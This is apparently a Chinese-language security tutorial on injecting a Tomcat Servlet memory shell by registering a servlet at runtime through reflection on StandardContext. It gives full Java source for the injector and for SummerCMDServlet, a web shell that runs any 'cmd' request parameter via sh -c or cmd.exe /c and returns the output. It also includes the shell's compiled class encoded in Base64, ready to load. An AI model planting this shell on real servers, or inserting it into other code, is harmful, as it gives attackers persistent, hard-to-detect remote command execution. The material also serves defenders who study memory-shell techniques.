# 通过模拟 servletContext.addServlet 注册 Servlet 内存马

## Servlet内存马基本知识

Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一

与 Filter 相同，本小节也仅仅讨论使用 ServletContext 的相关方法添加 Servlet。

还是首先来看一下实现类 ApplicationContext 的 `addServlet` 方法:

![img](http://cdn.ayusummer233.top/DailyNotes/202409291130585.png)

与上一小节看到的 `addFilter` 方法十分类似。那么我们面临同样的问题，在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 的？这个过程简单一点，只有两部走：

- ApplicationServletRegistration 的 `addMapping` 方法调用 `StandardContext#addServletMapping` 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）
- 同时在 servletMappings 中添加 URL 路径与 name 的映射。

这里直接调用相关方法进行添加，当然是用反射直接写入也可以，有一些逻辑较为复杂。

---

## 模拟 Servlet 动态加载

开发与测试环境可以用 Tomcat Filter 内存马中的环境, 是一样的

---

### 编写一个示例 Servlet

```java
package com.summer233;

import java.io.IOException;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class SummerBasicServlet implements Servlet {
   public SummerBasicServlet() {
   }

   @Override
   public void init(ServletConfig servletConfig) throws ServletException {
   }

   @Override
   public ServletConfig getServletConfig() {
      return null;
   }

   @Override
   public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
      servletResponse.getWriter().println("this is a new Servlet");
      // PS: 不可以像下面这样输出中文, 否则后面动态注册Servlet会失败而且没有日志(
      // servletResponse.getWriter().println("这是一个新增Servlet");
   }

   @Override
   public String getServletInfo() {
      return null;
   }

   @Override
   public void destroy() {
   }
}

```

`mvn clean package` 编译完成后取 class 文件编码成 Base64 字符串

![image-20240929170709368](http://cdn.ayusummer233.top/DailyNotes/202409291707532.png)

```txt
yv66vgAAAEEANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCwAIAAkHAAoMAAsADAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAA4BABV0aGlzIGlzIGEgbmV3IFNlcnZsZXQKABAAEQcAEgwAEwAUAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYHABYBACBjb20vc3VtbWVyMjMzL1N1bW1lckJhc2ljU2VydmxldAcAGAEAFWphdmF4L3NlcnZsZXQvU2VydmxldAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9zdW1tZXIyMzMvU3VtbWVyQmFzaWNTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAuAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAF1N1bW1lckJhc2ljU2VydmxldC5qYXZhACEAFQACAAEAFwAAAAYAAQAFAAYAAQAZAAAAMwABAAEAAAAFKrcAAbEAAAACABoAAAAKAAIAAAALAAQADAAbAAAADAABAAAABQAcAB0AAAABAB4AHwACABkAAAA1AAAAAgAAAAGxAAAAAgAaAAAABgABAAAAEAAbAAAAFgACAAAAAQAcAB0AAAAAAAEAIAAhAAEAIgAAAAQAAQAjAAEAJQAmAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAFAAbAAAADAABAAAAAgAcAB0AAAABACcAKAACABkAAABOAAIAAwAAAAwsuQAHAQASDbYAD7EAAAACABoAAAAKAAIAAAAZAAsAHAAbAAAAIAADAAAADAAcAB0AAAAAAAwAKQAqAAEAAAAMACsALAACACIAAAAGAAIAIwAtAAEALwAwAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAIAAbAAAADAABAAAAAgAcAB0AAAABADEABgABABkAAAArAAAAAQAAAAGxAAAAAgAaAAAABgABAAAAJQAbAAAADAABAAAAAQAcAB0AAAABADIAAAACADM=
```

---

### 动态加载示例Servlet

直接沿用上一节中动态添加 Filter 的开发环境与项目即可

DynamicAddServlet

- `src/main`
  - `java/com/summer233`
    - [DemoServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/DemoServlet.java)
    - [IndexServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/IndexServlet.java)
    - (*)[DynamicUtils.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/DynamicUtils.java)
    - [AddTomcatFilter.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/AddTomcatFilter.java)
    - (*)[AddTomcatServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/AddTomcatServlet.java)
  - `webapp/WEB-INF`
    - [web.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/webapp/WEB-INF/web.xml)
- [pom.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/pom.xml)

---

其中 `AddTomcatServlet.java`  与 `AddTomcatFilter` 大同小异, 这里就不做过多解释了

```java
package com.summer233;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

// import static com.summer233.DynamicUtils.SERVLET_CLASS_STRING;
import static com.summer233.DynamicUtils.BASIC_SEVLET_CLASS_STRING_BASE64;



/**
 * 访问这个 Servlet 将会动态添加自定义 Servlet
 * 测试版本 Tomcat 8.5.100
 *
 * @author su18,233
 */

@WebServlet(name = "DynamicAddTomcatServlet", urlPatterns = "/dynamicAddServlet")
public class AddTomcatServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
            PrintWriter writer = resp.getWriter();
            writer.println("debug info print test: start to add servlet<br>");
			String servletName = "summerDynamicAddServletBasic";

			// 从 request 中获取 servletContext
			ServletContext servletContext = req.getServletContext();

			// 如果已有此 servletName 的 Servlet，则不再重复添加
			if (servletContext.getServletRegistration(servletName) == null) {

				StandardContext o = null;

				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
				while (o == null) {
					Field f = servletContext.getClass().getDeclaredField("context");
					f.setAccessible(true);
					Object object = f.get(servletContext);

					switch (object) {
						case ServletContext sc -> servletContext = sc;
						case StandardContext sc -> o = sc;
						default -> throw new IllegalStateException("Unexpected value: " + object);
					}
				}

				// 创建自定义 Servlet
				// Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
				Class<?> servletClass = DynamicUtils.getClass(BASIC_SEVLET_CLASS_STRING_BASE64);
				

				// 使用 Wrapper 封装 Servlet
				Wrapper wrapper = o.createWrapper();
				wrapper.setName(servletName);
				wrapper.setLoadOnStartup(1);
				// wrapper.setServlet((Servlet) servletClass.newInstance());
				// 上述函数似乎 deprecated 了, 使用下面的函数
				wrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
				wrapper.setServletClass(servletClass.getName());

				// 向 children 中添加 wrapper
				o.addChild(wrapper);

				// 添加 servletMappings
				// o.addServletMapping("/basicServlet", servletName);
				// 上述函数似乎 deprecated 了, 使用下面的函数
				o.addServletMappingDecoded("/basicServlet", servletName);
				writer.println("tomcat servlet added");

			} else{
				writer.println("servlet already exists");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
```

`mvn clean package` 生成目标 war 文件部署到 `tomcat:8` 的 webapps 目录下

![image-20240929171908431](http://cdn.ayusummer233.top/DailyNotes/202409291719527.png)

访问  `/dynamicAddServlet` 添加 Servlet:

![image-20240929171958291](http://cdn.ayusummer233.top/DailyNotes/202409291719347.png)

访问 `/basicServlet`查看结果:

![image-20240929172023720](http://cdn.ayusummer233.top/DailyNotes/202409291720791.png)

---

## 构造恶意Servlet并动态加载

```java
package com.summer233;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

public class SummerCMDServlet implements Servlet {
   public SummerCMDServlet() {
   }

   @Override
   public void init(ServletConfig servletConfig) throws ServletException {
   }

   @Override
   public ServletConfig getServletConfig() {
      return null;
   }

   @Override
   public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        servletResponse.setContentType("text/html; charset=UTF-8");
        servletResponse.setCharacterEncoding("UTF-8");
        servletResponse.getWriter().println("this is a SummerCMDServlet<br>");
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[] { "sh", "-c", req.getParameter("cmd") }
                    : new String[] { "cmd.exe", "/c", req.getParameter("cmd") };
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            servletResponse.getWriter().close();
        }
   }

   @Override
   public String getServletInfo() {
      return null;
   }

   @Override
   public void destroy() {
   }
}
```

`mvn clean package` 编译后取 class 文件编码为 Base64 字符串:

```
yv66vgAAAEEAoAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAANjbWQLAB8AJAwAJQAmAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACgBAAdvcy5uYW1lCgAqACsHACwMAC0AJgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQoALwAwBwAxDAAyADMBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgANQEAA3dpbgoALwA3DAA4ADkBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggAOwEAAnNoCAA9AQACLWMIAD8BAAdjbWQuZXhlCABBAQACL2MKAEMARAcARQwARgBHAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBDAEkMAEoASwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBNAE4HAE8MAFAAUQEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAUwEA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
```

相应修改项目代码重新编译



